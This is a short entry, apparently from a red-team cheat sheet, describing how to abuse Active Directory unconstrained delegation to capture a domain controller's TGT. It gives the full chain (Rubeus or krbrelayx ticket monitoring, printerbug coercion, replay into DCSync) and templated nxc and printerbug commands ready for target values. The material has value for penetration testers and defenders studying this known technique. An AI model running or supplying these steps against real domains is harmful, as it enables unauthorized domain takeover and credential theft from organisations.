---
id: unconstrained-deleg-tgt
title: Unconstrained delegation — capture a DC TGT
section: Active Directory — attack paths
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1558]
platform: [windows, network]
source: Lee Christensen & Will Schroeder, "The Unintended Risks of Trusting Active Directory" (SpecterOps)
pair: unconstrained-deleg-4624
---

A host with unconstrained delegation (`TRUSTED_FOR_DELEGATION`) caches the TGT of
*anyone* who authenticates to it. Own such a host, run a TGT monitor on it (Rubeus
`monitor` on Windows, `krbrelayx.py` on Linux), then coerce a DC to authenticate
to you with printerbug — its TGT lands in your cache and you replay it into DCSync.
`{{rhost}}` is the DC (coerced); `{{lhost}}` is the unconstrained host you control
(same slot roles as `coerce-petitpotam`).

```sh
nxc ldap {{rhost}} -u {{user}} -p {{password}} --trusted-for-delegation
printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
```
